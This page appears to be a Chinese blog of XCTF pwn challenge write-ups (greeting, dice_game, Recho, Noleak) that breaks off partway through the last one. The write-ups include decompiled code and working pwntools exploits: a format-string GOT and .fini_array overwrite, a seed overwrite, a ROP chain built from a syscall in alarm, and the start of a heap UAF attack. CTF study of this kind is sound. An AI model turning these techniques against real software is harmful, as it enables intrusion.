<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> __cdecl <span class="title">getnline</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  fgets(s, n, <span class="built_in">stdin</span>);</span><br><span class="line">  v3 = <span class="built_in">strchr</span>(s, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strlen</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>getnline函数中调用了strlen函数，利用格式化字符串漏洞可以将strlen got 表项改为system_plt </li>
</ul>
<p>利用格式化字符串漏洞可以将.fini_array 段内容改为main函数起始位置，实现程序的无限循环，具体原理可以看<a href="https://bbs.ichunqiu.com/thread-43624-1-1.html" target="_blank" rel="noopener">这篇文章</a></p>
<blockquote>
<p>程序在main函数前会调用.init段代码和.init_array段的函数数组中每一个函数指针。同样的，main函数结束后也会调用.fini段代码和.fini._arrary段的函数数组中的每一个函数指针。</p>
</blockquote>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'i386'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"><span class="comment">#sh=remote(host='111.198.29.45', port=44521)</span></span><br><span class="line">sh = process(<span class="string">'./greeting'</span>)</span><br><span class="line">e = ELF(<span class="string">'./greeting'</span>)</span><br><span class="line"></span><br><span class="line">system_plt = e.plt[<span class="string">'system'</span>]</span><br><span class="line">strlen_got = e.got[<span class="string">'strlen'</span>]</span><br><span class="line"><span class="comment">#print(hex(system_plt))</span></span><br><span class="line">fini_array = <span class="number">0x08049934</span></span><br><span class="line">main = <span class="number">0x080484f0</span></span><br><span class="line"><span class="comment">#进行对齐</span></span><br><span class="line">payload = <span class="string">b'aa'</span></span><br><span class="line"><span class="comment">#0x804 -&gt; strlen_got+2, 0x804 -&gt; fini_array+2</span></span><br><span class="line"><span class="comment">#0x8490 -&gt; strlen_got, 0x84f0 -&gt; fini_array</span></span><br><span class="line">payload += flat([strlen_got+<span class="number">2</span>, fini_array+<span class="number">2</span>,strlen_got, fini_array])</span><br><span class="line"><span class="comment">#0x804 - 4 * 4 - 2 - 18 = 2016</span></span><br><span class="line"><span class="comment">#0x8490 - 0x804 = 31884</span></span><br><span class="line">payload += <span class="string">'%2016c%12$hn%13$hn%31884c%14$hn%96c%15$hn'</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/04/02/dice-game/">【XCTF攻防世界】 dice_game</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-04-02</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/pwn/">pwn</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/pwn/">pwn</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ctf/">ctf</a></span><div class="content"><blockquote>
</blockquote>
<h1 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">'/home/soinux/ctf/xctf/pwn/dice_game/dice_game'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">55</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+37h] [rbp-19h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+4Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  *(_QWORD *)seed = time(<span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome, let me know your name: "</span>, a2);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v6 = <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v6 &lt;= <span class="number">49</span> )</span><br><span class="line">    buf[v6 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hi, %s. Let's play a game.\n"</span>, buf);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  v8 = <span class="number">1</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Game %d/50\n"</span>, v8);</span><br><span class="line">    v5 = sub_A20();</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">50</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      print_flag((__int64)buf);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Bye bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">guess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int16 v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  __int16 v2; <span class="comment">// [rsp+Eh] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give me the point(1~6): "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%hd"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= <span class="number">0</span> || v1 &gt; <span class="number">6</span> || v2 &lt;= <span class="number">0</span> || v2 &gt; <span class="number">6</span> )</span><br><span class="line">      _assert_fail(<span class="string">"(point&gt;=1 &amp;&amp; point&lt;=6) &amp;&amp; (sPoint&gt;=1 &amp;&amp; sPoint&lt;=6)"</span>, <span class="string">"dice_game.c"</span>, <span class="number">0x18</span>u, <span class="string">"dice_game"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 == v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You win."</span>);</span><br><span class="line">      result = <span class="number">1L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You lost."</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid value!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路很清晰，覆盖seed为固定值，然后猜对50次，执行print_flag，就能得到flag，可以用Python ctypes模块模拟c库的随机数生成函数。</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = remote(host='111.198.29.45', port=50672)</span></span><br><span class="line">sh = process(<span class="string">'./dice_game'</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b'a'</span> * <span class="number">0x40</span> + p64(<span class="number">1</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">  num = libc.rand() % <span class="number">6</span> + <span class="number">1</span></span><br><span class="line">  sh.sendline(str(num))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/04/02/Recho/">【XCTF攻防世界】 Recho</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-04-02</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/pwn/">pwn</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/pwn/">pwn</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ctf/">ctf</a></span><div class="content"><h1 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;soinux&#x2F;ctf&#x2F;xctf&#x2F;pwn&#x2F;recho&#x2F;recho&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  Init();</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"Welcome to Recho server!\n"</span>, <span class="number">0x19</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">read</span>(<span class="number">0</span>, &amp;nptr, <span class="number">0x10</span>uLL) &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = atoi(&amp;nptr);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">15</span> )</span><br><span class="line">      v7 = <span class="number">16</span>;</span><br><span class="line">    v6 = <span class="built_in">read</span>(<span class="number">0</span>, buf, v7);</span><br><span class="line">    buf[v6] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>显然可以栈溢出， 不过没法多次leak，DynELF应该是不用想了，F12 + shift 一下， 发现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000601058 flag            db &#39;flag&#39;,0</span><br></pre></td></tr></table></figure>

<p>程序自身提供给我们’flag’, 那应该是利用open + read + wirte 直接得到flag,  但程序没有导入open函数，不过程序导入了alarm函数， 因为系统调用一般是通过syscall实现，alarm函数内部一定会有syscall，那我们就可以将alarm的got表值进行偏移， 构造syscall<br>动态调试发现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7fffff0fc200 &lt;alarm&gt;:      mov    eax,0x25 </span><br><span class="line">0x7fffff0fc205 &lt;alarm+5&gt;:    syscall</span><br></pre></td></tr></table></figure>
<p>alarm got表值加5就可以构造出syscall， 然后就可以调用open获得flag文件描述符， 这里需要注意：</p>
<blockquote>
<p>open函数返回的文件描述符fd一定是未使用的最小的文件描述符。</p>
</blockquote>
<p>所以，除去已经默认打开的三个文件，这次返回的文件描述符应该是3</p>
<p>利用ROPgadget得到的一些gadget：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040070d : add byte ptr [rdi], al ; ret</span><br><span class="line">0x00000000004006fc : pop rax ; ret</span><br><span class="line">0x00000000004008a3 : pop rdi ; ret</span><br><span class="line">0x00000000004006fe : pop rdx ; ret</span><br><span class="line">0x00000000004008a1 : pop rsi ; pop r15 ; ret</span><br></pre></td></tr></table></figure>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">sh = process(<span class="string">'./recho'</span>)</span><br><span class="line"><span class="comment">#sh = remote(host='111.198.29.45', port=43098)</span></span><br><span class="line">e = ELF(<span class="string">'./recho'</span>)</span><br><span class="line">pop_rax = <span class="number">0x4006fc</span></span><br><span class="line">pop_rdi = <span class="number">0x4008a3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4008a1</span></span><br><span class="line">pop_rdx = <span class="number">0x4006fe</span></span><br><span class="line">add_rdi = <span class="number">0x40070d</span></span><br><span class="line">flag = <span class="number">0x601058</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'a'</span> * <span class="number">0x38</span></span><br><span class="line"><span class="comment">#构造syscall</span></span><br><span class="line">payload += p64(pop_rdi) + p64(e.got[<span class="string">'alarm'</span>]) + p64(pop_rax) + p64(<span class="number">5</span>) + p64(ad  d_rdi)</span><br><span class="line"><span class="comment">#调用利用syscall调用open</span></span><br><span class="line">payload += p64(pop_rax) + p64(<span class="number">2</span>) + p64(pop_rdi) + p64(flag) + p64(pop_rsi_r15)   + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) +  p64(e.plt[<span class="string">'alarm'</span>])</span><br><span class="line"><span class="comment">#调用read</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi_r15) + p64(e.bss(<span class="number">0</span>)) + p64(<span class="number">0</span>) +   p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(e.plt[<span class="string">'read'</span>])</span><br><span class="line"><span class="comment">#调用write</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(e.bss(<span class="number">0</span>)) + p64(<span class="number">0</span>) +   p64(pop_rdx) +p64(<span class="number">0x100</span>) + p64(e.plt[<span class="string">'write'</span>])</span><br><span class="line">sh.sendline(str(<span class="number">1000</span>))</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.shutdown()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>pwntools字符串打包模块有函数flat， 可以简化payload构造<br>以下代码出自某 <a href="https://wanghaichen.com/index.php/archives/recho.html" target="_blank" rel="noopener">大佬</a>的博客</p>
<blockquote>
<p> payload = flat([‘t3ls’.ljust(0x38, ‘\x00’)])<br>    payload += flat([pop_rdi, e.got[‘alarm’], pop_rax, 5, add_rdi_al])<br>    payload += flat([pop_rdi, flag, pop_rsi_r15, 0, 0, pop_rdx, 0, pop_rax, 2, syscall])<br>    payload += flat([pop_rdi, 3, pop_rsi_r15, e.bss(0), 0, pop_rdx, 64, e.plt[‘read’]])<br>    payload += flat([pop_rdi, 1, pop_rsi_r15, e.bss(0), 0, pop_rdx, 64, e.plt[‘write’]])</p>
</blockquote>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/03/31/Noleak/">【XCTF攻防世界】 Noleak</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-31</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/pwn/">pwn</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/pwn/">pwn</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ctf/">ctf</a></span><div class="content"><blockquote>
<p>我是一条小咸鱼~~~ 小咸鱼~~~</p>
</blockquote>
<h1 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">soinux@Caiji:~/ctf/xctf/pwn/noleak$ checksec timu</span><br><span class="line">[*] <span class="string">'/home/soinux/ctf/xctf/pwn/noleak/timu'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<ul>
<li>开了Full RELRO, 不能快乐的改写got表了</li>
</ul>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>一共三种操作 create，delete 和 update :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">"Index: "</span>, <span class="number">7u</span>);</span><br><span class="line">  v0 = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">9</span> )</span><br><span class="line">    <span class="built_in">free</span>(buf[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>存在UAF 和 double free漏洞 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">upd</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> nbytes; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">"Index: "</span>, <span class="number">7u</span>);</span><br><span class="line">  LODWORD(v0) = get_num();</span><br><span class="line">  v3 = (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v0 &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = buf[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v0];</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">"Size: "</span>, <span class="number">6u</span>);</span><br><span class="line">      nbytes = get_num();</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">"Data: "</span>, <span class="number">6u</span>);</span><br><span class="line">      LODWORD(v0) = <span class="built_in">read</span>(<span class="number">0</span>, buf[v3], nbytes);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>nbytes大小未限制，可进行堆溢出攻击</li>
</ul>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>有UAF可以实现任意地址写， 但got表只读，要另辟蹊径，改写__malloc_hook, __malloc_hook 在 unsortedbin 附近， 动态调试如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">r = process(<span class="string">'./timu'</span>)</span><br><span class="line"><span class="comment">#打印进程号，便于gdb attach 进程</span></span><br><span class="line">print(<span class="string">'PID: '</span> + str(proc.pidof(r)[<span 